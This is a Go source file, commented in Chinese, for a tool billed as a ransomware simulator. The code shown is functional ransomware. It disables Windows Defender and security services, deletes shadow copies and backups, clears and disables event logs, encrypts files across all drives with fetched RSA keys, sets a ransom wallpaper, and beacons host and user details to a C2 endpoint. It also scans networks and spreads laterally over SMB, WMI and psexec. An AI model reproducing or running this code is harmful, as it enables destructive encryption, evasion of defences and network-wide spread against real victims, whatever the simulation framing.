	if !logEnabled || failedLogFile == nil {
		return
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] FAILED: %s - %s\n",
		timestamp, filePath, errorMsg)

	failedLogFile.WriteString(logEntry)

	// 同时记录到操作日志
	logOperation(fmt.Sprintf("加密失败: %s - %s", filePath, errorMsg))
}

// 记录操作日志
func logOperation(message string) {
	if !logEnabled || operationsLogFile == nil {
		return
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] %s\n", timestamp, message)

	operationsLogFile.WriteString(logEntry)
}

// 获取或解析公钥（带缓存）
func getPublicKey(publicKeyStr string) (*rsa.PublicKey, error) {
	publicKeyCacheLock.RLock()
	if publicKeyCache != nil && publicKeyCacheStr == publicKeyStr {
		publicKeyCacheLock.RUnlock()
		return publicKeyCache, nil
	}
	publicKeyCacheLock.RUnlock()

	// 解析公钥
	publicKeyCacheLock.Lock()
	defer publicKeyCacheLock.Unlock()

	// 再次检查，防止并发重复解析
	if publicKeyCache != nil && publicKeyCacheStr == publicKeyStr {
		return publicKeyCache, nil
	}

	// 清理公钥字符串，确保格式正确
	cleanedKeyStr := strings.TrimSpace(publicKeyStr)

	// 检查PEM格式
	if !strings.HasPrefix(cleanedKeyStr, "-----BEGIN") {
		// 尝试添加PEM头
		cleanedKeyStr = fmt.Sprintf("-----BEGIN PUBLIC KEY-----\n%s\n-----END PUBLIC KEY-----", cleanedKeyStr)
	}

	// 解码PEM
	pemBlock, _ := pem.Decode([]byte(cleanedKeyStr))
	if pemBlock == nil {
		// 尝试不同的PEM格式
		if strings.Contains(cleanedKeyStr, "RSA PUBLIC KEY") {
			cleanedKeyStr = strings.Replace(cleanedKeyStr, "RSA PUBLIC KEY", "PUBLIC KEY", 1)
			pemBlock, _ = pem.Decode([]byte(cleanedKeyStr))
		}

		if pemBlock == nil {
			return nil, fmt.Errorf("解码PEM公钥失败: 无效的PEM格式")
		}
	}

	// 解析公钥
	pub, err := x509.ParsePKIXPublicKey(pemBlock.Bytes)
	if err != nil {
		// 尝试解析PKCS1格式
		pub, err = x509.ParsePKCS1PublicKey(pemBlock.Bytes)
		if err != nil {
			return nil, fmt.Errorf("解析公钥失败: %w", err)
		}
	}

	rsaPubKey, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("公钥不是RSA类型")
	}

	// 更新缓存
	publicKeyCache = rsaPubKey
	publicKeyCacheStr = publicKeyStr

	return rsaPubKey, nil
}

// 新增功能：停止Windows服务
func stopWindowsServices() {
	if logEnabled {
		logOperation("开始停止Windows服务")
	}

	// 停止数据库服务
	for _, service := range windowsDatabaseServices {
		fmt.Printf("  - 停止数据库服务: %s\n", service)

		if logEnabled {
			logOperation(fmt.Sprintf("尝试停止数据库服务: %s", service))
		}

		// 使用sc命令停止服务
		cmd := exec.Command("sc", "stop", service)
		_ = cmd.Run()

		// 使用net命令停止服务
		cmd = exec.Command("net", "stop", service)
		_ = cmd.Run()

		// 禁用服务
		cmd = exec.Command("sc", "config", service, "start=", "disabled")
		_ = cmd.Run()

		time.Sleep(100 * time.Millisecond)
	}

	// 停止安全服务
	for _, service := range windowsSecurityServices {
		fmt.Printf("  - 停止安全服务: %s\n", service)

		if logEnabled {
			logOperation(fmt.Sprintf("尝试停止安全服务: %s", service))
		}

		// 使用sc命令停止服务
		cmd := exec.Command("sc", "stop", service)
		_ = cmd.Run()

		// 使用net命令停止服务
		cmd = exec.Command("net", "stop", service)
		_ = cmd.Run()

		// 尝试杀死相关进程
		serviceExe := strings.ToLower(service)
		cmd = exec.Command("taskkill", "/F", "/IM", serviceExe+".exe")
		_ = cmd.Run()

		time.Sleep(100 * time.Millisecond)
	}

	// 停止Windows Defender
	fmt.Println("  - 停止Windows Defender...")
	if logEnabled {
		logOperation("尝试停止Windows Defender")
	}

	// 停止实时保护
	cmd := exec.Command("powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true")
	_ = cmd.Run()

	// 停止扫描服务
	cmd = exec.Command("powershell", "-Command", "Set-MpPreference -DisableScanning $true")
	_ = cmd.Run()

	if logEnabled {
		logOperation("Windows服务停止完成")
	}
}

// 新增功能：清理Windows数据库内存
func cleanWindowsDatabaseMemory() {
	if logEnabled {
		logOperation("开始清理Windows数据库内存和缓存")
	}

	fmt.Println("  - 清理SQL Server缓存...")

	if logEnabled {
		logOperation("清理SQL Server缓存")
	}

	// 清理SQL Server缓存
	cleanSQLServerCache()

	fmt.Println("  - 清理系统内存...")

	if logEnabled {
		logOperation("清理系统内存")
	}

	// 清理系统内存
	cmd := exec.Command("powershell", "-Command", "Clear-EventLog -LogName Application, System, Security")
	_ = cmd.Run()

	// 清理DNS缓存
	cmd = exec.Command("ipconfig", "/flushdns")
	_ = cmd.Run()

	if logEnabled {
		logOperation("Windows数据库内存和缓存清理完成")
	}
}

func cleanSQLServerCache() {
	// 尝试使用SQLCMD清理缓存
	cleanCommands := []string{
		"DBCC DROPCLEANBUFFERS",
		"DBCC FREEPROCCACHE",
		"DBCC FREESYSTEMCACHE ('ALL')",
		"DBCC FREESESSIONCACHE",
	}

	for _, sqlCmd := range cleanCommands {
		cmd := exec.Command("sqlcmd", "-Q", sqlCmd)
		_ = cmd.Run()
	}
}

func killLockingProcesses() {
	fmt.Println("\n[+] 终止占用文件的进程...")

	if logEnabled {
		logOperation("开始终止占用文件的进程")
	}

	for _, proc := range targetProcessesWindows {
		fmt.Printf("  - 终止进程: %s\n", proc)

		if logEnabled {
			logOperation(fmt.Sprintf("尝试终止进程: %s", proc))
		}

		cmd := exec.Command("taskkill", "/F", "/IM", proc)
		_ = cmd.Run()
	}
	time.Sleep(1 * time.Second)

	if logEnabled {
		logOperation("进程终止完成")
	}
}

func defaultLockPath() string {
	return filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")
}

// forceReleaseLock 仅清理“持有者已不存在”的陈旧锁，避免误删正在运行的实例锁
func forceReleaseLock() {
	path := defaultLockPath()
	data, err := os.ReadFile(path)
	if err != nil {
		return
	}
	pid, _ := strconv.Atoi(strings.TrimSpace(string(data)))
	if pid <= 0 || !processAlive(pid) {
		_ = os.Remove(path)
	}
}

func createSingleInstanceLock() bool {
	lockFilePath = defaultLockPath()
	attempts := 1
	if isDaemonChild() {
		// 等父进程退出释放锁（最多约 15 秒）；父进程异常退出时可通过 PID 检测接管
		attempts = 150
	}
	for i := 0; i < attempts; i++ {
		if tryAcquireLockFile() {
			return true
		}
		if i < attempts-1 {
			time.Sleep(100 * time.Millisecond)
		}
	}
	return false
}

func tryAcquireLockFile() bool {
	f, err := os.OpenFile(lockFilePath, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0666)
	if err == nil {
		_, _ = f.WriteString(strconv.Itoa(os.Getpid()) + "\n")
		_ = f.Close()
		return true
	}
	data, readErr := os.ReadFile(lockFilePath)
	if readErr != nil {
		return false
	}
	pid, _ := strconv.Atoi(strings.TrimSpace(string(data)))
	if pid > 0 && processAlive(pid) {
		return false
	}
	// 持有者已退出：接管锁
	_ = os.Remove(lockFilePath)
	f2, err2 := os.OpenFile(lockFilePath, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0666)
	if err2 != nil {
		return false
	}
	_, _ = f2.WriteString(strconv.Itoa(os.Getpid()) + "\n")
	_ = f2.Close()
	return true
}

func cleanupLockFile() {
	if lockFilePath != "" {
		_ = os.Remove(lockFilePath)
	}
}

func setupFlags(fs *flag.FlagSet) *options {
	opt := &options{}

	fs.IntVar(&opt.workers, "workers", runtime.NumCPU(), "并发 worker 数量")
	fs.BoolVar(&opt.dryRun, "dry-run", false, "演习模式")
	fs.StringVar(&opt.extensions, "ext", "", "指定要加密的文件扩展名 (e.g., '.txt,.pdf')")
	fs.StringVar(&opt.directory, "dir", "", "指定目标 (目录或单个文件); 将忽略扩展名限制")
	fs.BoolVar(&opt.removeOriginal, "remove", false, "加密后删除原文件")
	fs.BoolVar(&opt.logFlag, "log", false, "启用日志功能，在程序所在目录输出日志文件")
	fs.BoolVar(&opt.stealthMode, "stealth-mode", false, "隐身模式：执行额外清理操作")
	fs.BoolVar(&opt.noStopServices, "no-stop-services", false, "跳过停止服务操作")
	fs.BoolVar(&opt.noKillProcs, "no-kill-procs", false, "跳过终止进程操作")
	fs.BoolVar(&opt.noClearLogs, "no-clear-logs", false, "跳过清除日志操作")
	fs.IntVar(&opt.aggressiveDelay, "aggressive-delay", 0, "操作间随机延迟上限（毫秒），0=无延迟")

	// ---- 后台驻留与密钥保留 ----
	fs.BoolVar(&opt.resident, "resident", false, "加密完成后驻留后台（保持心跳与单实例锁，Ctrl+C 退出）")
	fs.BoolVar(&opt.keepKey, "keep-key", false, "把密钥（UUID + 公钥）保存在内存与本地缓存中，任务结束后不删除")
	fs.StringVar(&heartbeatToken, "heartbeat-token", os.Getenv("RANSOM_HEARTBEAT_TOKEN"), "心跳接收密钥（服务端启用后需填写，随心跳以 X-Heartbeat-Token 发送）")

	// ---- 定时任务后台化 ----
	fs.BoolVar(&opt.foreground, "foreground", false, "定时任务保持前台等待（默认自动转入后台）")
	fs.BoolVar(&opt.noAutostart, "no-autostart", false, "不注册开机自启（重启后需手动启动）")
	fs.BoolVar(&opt.daemonChild, "daemon-child", false, "内部参数：后台子进程标记，请勿手动使用")

	// ---- 定时触发 ----
	fs.DurationVar(&opt.delay, "delay", 0, "启动前等待时长（如 30s/5m/2h），0=不等待")
	fs.StringVar(&opt.atTime, "at", "", "定时启动时刻（2006-01-02 15:04:05 / 15:04 / RFC3339，15:04 已过则顺延次日）")
	fs.DurationVar(&opt.randomDelay, "random-delay", 0, "在定时基础上叠加 0~X 的随机抖动，规避固定时序特征")
	fs.BoolVar(&opt.persistSchedule, "persist-schedule", false, "把定时注册为系统计划任务（schtasks），程序退出后到点由系统唤起")
	fs.StringVar(&opt.scheduleTaskName, "schedule-task-name", "RansomSimTask", "计划任务名称")
	fs.BoolVar(&opt.scheduleCleanup, "schedule-cleanup", true, "计划任务唤起执行结束后自动删除任务")
	fs.BoolVar(&opt.scheduledRun, "scheduled-run", false, "内部标记：由计划任务唤起（注册任务时自动添加，无需手动指定）")

	// ---- 模拟攻击扫描（攻击面侦察）----
	fs.BoolVar(&opt.scan, "scan", false, "启用攻击面侦察（本地网段/指定目标的 TCP 端口发现）")
	fs.BoolVar(&opt.scanOnly, "scan-only", false, "仅执行侦察并输出报告，不加密文件、不执行破坏性操作")
	fs.StringVar(&opt.scanTargets, "scan-targets", "", "侦察目标（逗号分隔的 IP/CIDR/主机名，auto=自动使用本机网段）")
	fs.StringVar(&opt.scanTargetsFile, "scan-targets-file", "", "侦察目标清单文件（每行一个目标，# 开头为注释）")
	fs.StringVar(&opt.scanPorts, "scan-ports", "", "侦察端口列表（逗号分隔），默认内置常见企业服务端口")
	fs.IntVar(&opt.scanWorkers, "scan-workers", 128, "侦察并发数")
	fs.DurationVar(&opt.scanTimeout, "scan-timeout", 800*time.Millisecond, "单端口探测超时")
	fs.BoolVar(&opt.scanICMP, "scan-icmp", false, "先用 ping 探活再扫端口")

	// ---- 远程横向加密编排 ----
	fs.StringVar(&opt.remoteHosts, "remote-hosts", "", "远程目标（逗号分隔，支持 user@host、host:port）")
	fs.StringVar(&opt.remoteHostsFile, "remote-hosts-file", "", "远程目标清单文件（每行一个目标，# 开头为注释）")
	fs.BoolVar(&opt.remoteAuto, "remote-auto", false, "使用侦察结果中开放 SMB/SSH/WinRM 的主机作为远程目标（配合 --scan）")
	fs.StringVar(&opt.remoteUser, "remote-user", "", "远程认证用户名")
	fs.StringVar(&opt.remotePass, "remote-pass", "", "远程认证口令")
	fs.StringVar(&opt.remoteDomain, "remote-domain", "", "远程认证域（Domain\\user）")
	fs.StringVar(&opt.remoteKey, "remote-key", "", "SSH 私钥路径（仅 ssh 通道使用，Windows SMB/WMI 通道忽略）")
	fs.IntVar(&opt.remotePort, "remote-port", 0, "远程目标端口（默认 445，ssh 通道为 22）")
	fs.StringVar(&opt.remoteMethod, "remote-method", "auto", "远程通道: auto|smb|wmi|schtasks|psexec（smb=仅投递）")
	fs.StringVar(&opt.remoteStaging, "remote-staging", defaultRemoteStaging, "远端暂存目录（需为本地风格路径，如 C:\\ProgramData\\RsSim）")
	fs.StringVar(&opt.remoteArgs, "remote-args", "", "透传给远端 encryptor 的额外参数（如 \"-workers 8 -ext .docx\"）")
	fs.BoolVar(&opt.remoteConfirm, "remote-confirm", false, "确认真实执行远端加密（缺省仅做连通性+投递演练，远端以 -dry-run 运行）")
	fs.BoolVar(&opt.remoteCleanup, "remote-cleanup", false, "远程执行结束后清理远端暂存目录")

	fs.Usage = func() {
		_, _ = fmt.Fprintf(os.Stderr, "用法: %s [flags]\n", os.Args[0])
		_, _ = fmt.Fprintf(os.Stderr, "密钥获取优先级: 1) API接口获取 2) 本地公钥文件\n")
		_, _ = fmt.Fprintf(os.Stderr, "本地公钥文件格式:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - public_key_<uuid>.pem: 公钥文件，例如 public_key_5137d4c3-3901-4528-bfa9-6d9ce88fa287.pem\n")
		_, _ = fmt.Fprintf(os.Stderr, "注意: 当API不可用时，UUID将从公钥文件名中自动提取\n")
		_, _ = fmt.Fprintf(os.Stderr, "日志文件将输出到程序所在目录:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - success_encrypted.log: 成功加密的文件列表\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - failed_encrypted.log:  加密失败的文件列表\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - operations.log:        操作日志\n")
		_, _ = fmt.Fprintf(os.Stderr, "行为控制:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --stealth-mode:       隐身模式，执行额外清理\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --no-stop-services:   跳过停止数据库和安全服务\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --no-kill-procs:      跳过终止占用文件的进程\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --no-clear-logs:      跳过清除备份和日志文件\n")
		_, _ = fmt.Fprintf(os.Stderr, "后台驻留与密钥保留:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --resident:           加密完成后驻留后台（保持心跳，Ctrl+C 退出）\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --keep-key:           密钥保存在内存与本地缓存，任务结束后不删除\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --heartbeat-token:    心跳接收密钥（服务端启用后必填）\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --aggressive-delay:   操作间随机延迟上限（毫秒）\n")
		_, _ = fmt.Fprintf(os.Stderr, "定时触发:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --delay / --at / --random-delay: 定时启动（默认自动转入后台）\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --foreground:         定时任务保持前台等待（不自动后台化）\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --no-autostart:       不注册开机自启（重启后需手动启动）\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --persist-schedule:   注册系统计划任务（schtasks），退出后到点唤起\n")
		_, _ = fmt.Fprintf(os.Stderr, "模拟攻击扫描:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --scan / --scan-only: 攻击面侦察（端口发现 + 本机资产 + 报告）\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --scan-targets / --scan-targets-file: 侦察目标\n")
		_, _ = fmt.Fprintf(os.Stderr, "远程横向加密:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --remote-hosts / --remote-hosts-file / --remote-auto: 远程目标\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --remote-method:      auto|smb|wmi|schtasks|psexec（smb=仅投递）\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --remote-confirm:     确认真实执行远端加密（缺省仅投递+演练）\n")
		fs.PrintDefaults()
	}
	return opt
}

func showWarning(dryRun bool) {
	_, _ = fmt.Fprintf(os.Stderr, "\n************************** 警告 **************************\n")
	_, _ = fmt.Fprintf(os.Stderr, "此程序将自动扫描并加密指定范围内的文件。\n")
	_, _ = fmt.Fprintf(os.Stderr, "这是一个高度危险的模拟，请确保在隔离的环境中运行！\n")
	_, _ = fmt.Fprintf(os.Stderr, "**********************************************************\n\n")
	if dryRun {
		fmt.Println(">>> 已激活 [演习模式 (Dry Run)]，不会执行任何加密操作。")
	} else {
		fmt.Println(">>> 警告: 实时攻击模式已激活！将在 3 秒后自动开始...")
		time.Sleep(3 * time.Second)
	}
}

func countdown(message string, seconds int) {
	fmt.Println()
	for i := seconds; i >= 0; i-- {
		fmt.Printf("\r%s %d 秒后自动退出...", message, i)
		time.Sleep(1 * time.Second)
	}
	fmt.Println("\r程序已退出。                                  ")
}

// ---------------------------------------------------------------------------
// 终端心跳：每 30 秒向 C2 上报一次，供管理后台统计在线终端
// ---------------------------------------------------------------------------

var heartbeatState struct {
	mu      sync.RWMutex
	keyUUID string
	mode    string
	started atomic.Bool
	startAt time.Time
}

// setHeartbeatKey 记录本次运行使用的加密密钥 UUID（获取密钥后调用）
func setHeartbeatKey(uuid string) {
	heartbeatState.mu.Lock()
	heartbeatState.keyUUID = uuid
	heartbeatState.mu.Unlock()
}

// terminalID 生成稳定的终端标识（主机名 + 系统 + 架构 + 用户名 的指纹）
func terminalID() string {
	host, _ := os.Hostname()
	user := os.Getenv("USERNAME")
	if user == "" {
		user = os.Getenv("USER")
	}
	sum := sha256.Sum256([]byte(host + "|" + runtime.GOOS + "|" + runtime.GOARCH + "|" + user))
	sum[6] = (sum[6] & 0x0f) | 0x40
	sum[8] = (sum[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", sum[0:4], sum[4:6], sum[6:8], sum[8:10], sum[10:16])
}

// startHeartbeat 启动心跳协程：启动后 2 秒立即上报一次，之后每 30 秒上报一次
func startHeartbeat(mode string) {
	heartbeatState.mu.Lock()
	heartbeatState.mode = mode
	heartbeatState.mu.Unlock()
	heartbeatState.startAt = time.Now()
	heartbeatState.started.Store(true)

	go func() {
		time.Sleep(2 * time.Second)
		sendHeartbeat("start")
		ticker := time.NewTicker(heartbeatInterval)
		defer ticker.Stop()
		for range ticker.C {
			sendHeartbeat("ping")
		}
	}()
}

// stopHeartbeat 正常退出时上报一次 stop，让管理后台立即标记离线
func stopHeartbeat() {
	if !heartbeatState.started.Load() {
		return
	}
	heartbeatState.started.Store(false)
	sendHeartbeat("stop")
}

func sendHeartbeat(event string) {
	host, _ := os.Hostname()
	user := os.Getenv("USERNAME")
	if user == "" {
		user = os.Getenv("USER")
	}

	heartbeatState.mu.RLock()
	mode := heartbeatState.mode
	keyUUID := heartbeatState.keyUUID
	heartbeatState.mu.RUnlock()

	payload := map[string]interface{}{
		"id":       terminalID(),
		"hostname": host,
		"username": user,
		"os":       runtime.GOOS,
		"arch":     runtime.GOARCH,
		"version":  version,
		"mode":     mode,
		"key_uuid": keyUUID,
		"pid":      os.Getpid(),
		"uptime_s": int64(time.Since(heartbeatState.startAt).Seconds()),
		"event":    event,
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return
	}

	client := &http.Client{Timeout: 5 * time.Second}
	req, err := http.NewRequest("POST", heartbeatURL, bytes.NewReader(body))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Ransom-Simulator/"+version+" ("+runtime.GOOS+"/"+runtime.GOARCH+")")
	if heartbeatToken != "" {
		req.Header.Set("X-Heartbeat-Token", heartbeatToken)
	}

	resp, err := client.Do(req)
	if err != nil {
		if logEnabled {
			logOperation(fmt.Sprintf("心跳上报失败: %v", err))
		}
		return
	}
	defer func() { _ = resp.Body.Close() }()
	_, _ = io.Copy(io.Discard, resp.Body)
}

func simulateDestructiveActions() {
	time.Sleep(1 * time.Second)
	fmt.Println("\n[+] 执行破坏性操作...")
	fmt.Println("  - [IOC] 模拟: 清除 Shadow Copies...")

	if logEnabled {
		logOperation("开始执行破坏性操作：清除Shadow Copies")
	}

	// 清除卷影副本
	cmd := exec.Command("vssadmin", "delete", "shadows", "/for=C:", "/all", "/quiet")
	_ = cmd.Run()

	fmt.Println("  - [IOC] 模拟: 清除系统备份...")

	// 清除Windows备份
	cmd = exec.Command("wbadmin", "delete", "catalog", "-quiet")
	_ = cmd.Run()

	fmt.Println("  - [IOC] 模拟: 清除系统安全日志...")

	if logEnabled {
		logOperation("清除系统安全日志")
	}

	// 清除Windows事件日志
	cmd = exec.Command("wevtutil", "cl", "Application")
	_ = cmd.Run()

	cmd = exec.Command("wevtutil", "cl", "System")
	_ = cmd.Run()

	cmd = exec.Command("wevtutil", "cl", "Security")
	_ = cmd.Run()

	// 禁用Windows事件日志服务
	cmd = exec.Command("sc", "config", "EventLog", "start=", "disabled")
	_ = cmd.Run()

	cmd = exec.Command("sc", "stop", "EventLog")
	_ = cmd.Run()

	if logEnabled {
		logOperation("破坏性操作完成")
	}

	time.Sleep(1 * time.Second)
}

// ===================== 桌面壁纸（Win32 原生调用） =====================

const (
	spiSetDeskWallpaper = 0x0014
	spifUpdateIniFile   = 0x0001
	spifSendChange      = 0x0002
)

var (
	user32dll = syscall.NewLazyDLL("user32.dll")
	procSPI   = user32dll.NewProc("SystemParametersInfoW")
)

// applyDesktopWallpaper 调用 Win32 API 立即刷新桌面壁纸
func applyDesktopWallpaper(path string) error {
	p, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	ret, _, callErr := procSPI.Call(spiSetDeskWallpaper, 0, uintptr(unsafe.Pointer(p)), spifUpdateIniFile|spifSendChange)
	if ret == 0 {
		return fmt.Errorf("SystemParametersInfoW 调用失败: %v", callErr)
	}
	return nil
}

// readDesktopWallpaperReg 读取 HKCU\Control Panel\Desktop\Wallpaper 的当前值
func readDesktopWallpaperReg() (string, error) {
	out, err := exec.Command("reg", "query", `HKCU\Control Panel\Desktop`, "/v", "Wallpaper").Output()
	if err != nil {
		return "", err
	}
	for _, line := range strings.Split(string(out), "\n") {
		if idx := strings.Index(line, "REG_SZ"); idx >= 0 {
			return strings.TrimSpace(line[idx+len("REG_SZ"):]), nil
		}
	}
	return "", fmt.Errorf("未找到 Wallpaper 注册表值")
}

// createRansomWallpaper 生成勒索提示壁纸并设置为当前用户桌面壁纸
// removeOriginal 为 true 时壁纸会额外显示“源文件已被删除”的提示
func createRansomWallpaper(uuid string, removeOriginal bool) {
	fmt.Println("[*] 生成并设置勒索提示壁纸...")

	if logEnabled {
		logOperation(fmt.Sprintf("开始生成勒索提示壁纸 (删除源文件: %v)", removeOriginal))
	}

	// 记录原始壁纸路径，便于事后还原（参见 readme 的“如何还原”说明）
	if original, err := readDesktopWallpaperReg(); err == nil && strings.TrimSpace(original) != "" {
		fmt.Printf("[i] 原始桌面壁纸: %s\n", original)
		if logEnabled {
			logOperation("原始桌面壁纸: " + original)
		}
	}

	// 优先输出到程序所在目录，不可用时回退到用户桌面
	outPath := filepath.Join(programDir, ransomWallpaperFileName)
	if _, err := os.Stat(programDir); err != nil {
		if home, herr := os.UserHomeDir(); herr == nil {
			outPath = filepath.Join(home, "Desktop", ransomWallpaperFileName)
		}
	}

	// 使用内嵌脚本生成图片：直接调用 powershell，避免 cmd /C 的参数转义问题
	// -Ver 控制品牌版本号，-Remove 控制是否显示“源文件已被删除”提示
	script := fmt.Sprintf("& {%s} -OutPath '%s' -Uuid '%s' -Ver '%s' -Remove '%t'",
		strings.TrimSpace(wallpaperScript),
		strings.ReplaceAll(outPath, "'", "''"),
		strings.ReplaceAll(uuid, "'", "''"),
		strings.TrimPrefix(version, "v"),
		removeOriginal)

	if out, err := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script).CombinedOutput(); err != nil {
		fmt.Printf("[!] 生成壁纸失败: %v (%s)\n", err, strings.TrimSpace(string(out)))
		if logEnabled {
			logOperation(fmt.Sprintf("生成壁纸失败: %v", err))
		}
		return
	}

	if _, err := os.Stat(outPath); err != nil {
		fmt.Printf("[!] 壁纸文件未生成: %s (%v)\n", outPath, err)
		if logEnabled {
			logOperation(fmt.Sprintf("壁纸文件未生成: %v", err))
		}
		return
	}
	fmt.Printf("[+] 壁纸已生成: %s\n", outPath)

	// 注册表指向生成的图片，并设置为填充样式
	regCommands := [][]string{
		{"add", `HKCU\Control Panel\Desktop`, "/v", "Wallpaper", "/t", "REG_SZ", "/d", outPath, "/f"},
		{"add", `HKCU\Control Panel\Desktop`, "/v", "WallpaperStyle", "/t", "REG_SZ", "/d", "10", "/f"},
		{"add", `HKCU\Control Panel\Desktop`, "/v", "TileWallpaper", "/t", "REG_SZ", "/d", "0", "/f"},
	}
	for _, args := range regCommands {
		if err := exec.Command("reg", args...).Run(); err != nil {
			fmt.Printf("[!] 写入壁纸注册表失败: %v\n", err)
			if logEnabled {
				logOperation(fmt.Sprintf("写入壁纸注册表失败: %v", err))
			}
		}
	}

	// 回读注册表，确认壁纸路径已写入
	if got, err := readDesktopWallpaperReg(); err != nil {
		fmt.Printf("[!] 读取壁纸注册表失败: %v\n", err)
	} else if !strings.EqualFold(got, outPath) {
		fmt.Printf("[!] 壁纸注册表未按预期更新: 期望 %s, 实际 %s\n", outPath, got)
		if logEnabled {
			logOperation(fmt.Sprintf("壁纸注册表未按预期更新: 期望 %s, 实际 %s", outPath, got))
		}
	}

	// 调用 Win32 API 立即刷新壁纸（SPIF_UPDATEINIFILE | SPIF_SENDCHANGE）
	if err := applyDesktopWallpaper(outPath); err != nil {
		fmt.Printf("[!] 刷新壁纸失败: %v\n", err)
		if logEnabled {
			logOperation(fmt.Sprintf("刷新壁纸失败: %v", err))
		}
		return
	}

	fmt.Printf("[+] 壁纸已设置为: %s\n", outPath)
	if logEnabled {
		logOperation("壁纸设置完成: " + outPath)
	}
}

func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats bool) []string {
	var filesToProcess []string
	var roots []string
	if len(scanRoots) > 0 {
		roots = scanRoots
	} else {
		for _, drive := range "CDEFGHIJKLMNOPQRSTUVWXYZ" {
			drivePath := string(drive) + ":\\"
			if _, err := os.Stat(drivePath); err == nil {
				roots = append(roots, drivePath)
			}
		}
	}

	// 添加Windows数据库数据目录到扫描范围
	for _, dbDir := range windowsDatabaseDataDirs {
		if _, err := os.Stat(dbDir); err == nil {
			roots = append(roots, dbDir)
		}
	}

	fmt.Printf("[*] 扫描根目录: %v\n", roots)

	if logEnabled {
		logOperation(fmt.Sprintf("开始扫描文件，根目录: %v", roots))
		logOperation(fmt.Sprintf("加密所有格式: %v", encryptAllFormats))
	}

	for _, root := range roots {
		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if info.IsDir() {
				if isExcluded(path) {
					return filepath.SkipDir
				}
				return nil
			}
			fileName := filepath.Base(path)
			if isProtectedArtifact(fileName) {
				return nil
			}
			shouldProcess := false
			if encryptAllFormats {
				shouldProcess = true
			} else {
				shouldProcess = shouldEncrypt(path, extFilter)
			}
			if shouldProcess {
				filesToProcess = append(filesToProcess, path)
			}
			return nil
		})
	}

	if logEnabled {
		logOperation(fmt.Sprintf("扫描完成，找到 %d 个待加密文件", len(filesToProcess)))
	}

	return filesToProcess
}

// acquireKeys 统一获取密钥：API 优先；API 不可用（断网/超时/异常响应）时
// 直接回退到本地公钥，不再因网络问题中止。
// 返回 (uuid, 公钥PEM, 来源说明, error)
func acquireKeys() (string, string, string, error) {
	fmt.Print("[*] 尝试从API获取密钥... ")
	resp, apiErr := fetchKeysFromAPI()
	if apiErr == nil {
		if perr := validatePublicKey(resp.PublicKeyPEM); perr != nil {
			fmt.Printf("失败: %v\n", perr)
			apiErr = fmt.Errorf("API 返回的公钥无效: %w", perr)
		} else {
			fmt.Printf("成功，UUID: %s\n", resp.UUID)
			cachePublicKeyCopy(resp.UUID, resp.PublicKeyPEM)
			return resp.UUID, resp.PublicKeyPEM, "远程API", nil
		}
	} else {
		fmt.Printf("失败: %v\n", apiErr)
	}

	// 网络不可用（DNS/连接/超时）或 API 异常：直接使用本地密钥
	fmt.Println("[*] 联网获取密钥失败（网络不可用或 API 异常），回退到本地密钥...")
	uuid, pemText, filePath, localErr := loadLocalKey()
	if localErr != nil {
		return "", "", "", fmt.Errorf("联网获取密钥失败（可能无网络）: %v；本地回退失败: %v", apiErr, localErr)
	}
	fmt.Printf("[+] 已加载本地公钥: %s\n", filePath)
	return uuid, pemText, "本地公钥文件", nil
}

// validatePublicKey 校验公钥可被解析（静默，调用方负责输出）。
func validatePublicKey(pemText string) error {
	if _, err := getPublicKey(pemText); err != nil {
		return fmt.Errorf("公钥格式错误: %w", err)
	}
	return nil
}

// ---------------------------------------------------------------------------
// 密钥驻留：内存保存 + 本地缓存（--keep-key）
// ---------------------------------------------------------------------------

type keyCacheRecord struct {
	UUID           string `json:"uuid"`
	PublicKeyPEM   string `json:"public_key_pem"`
	CreatedAt      string `json:"created_at"`
	Mode           string `json:"mode"`
	RemoveOriginal bool   `json:"remove_original"`
	Version        string `json:"version"`
}

var (
	keyMemoryMu   sync.RWMutex
	keyMemoryUUID string
	keyMemoryPEM  string
)

// rememberKey 把本次运行使用的密钥保存在进程内存中（驻留期间不会释放）
func rememberKey(uuid, pemText string) {
	keyMemoryMu.Lock()
	keyMemoryUUID = uuid
	keyMemoryPEM = pemText
	keyMemoryMu.Unlock()
}

// memoryKey 读取内存中保存的密钥（供驻留状态输出使用）
func memoryKey() (uuid, pemText string) {
	keyMemoryMu.RLock()
	defer keyMemoryMu.RUnlock()
	return keyMemoryUUID, keyMemoryPEM
}

// persistKeyCache 把 UUID 与公钥写入本地缓存：程序目录 + 用户级缓存目录。
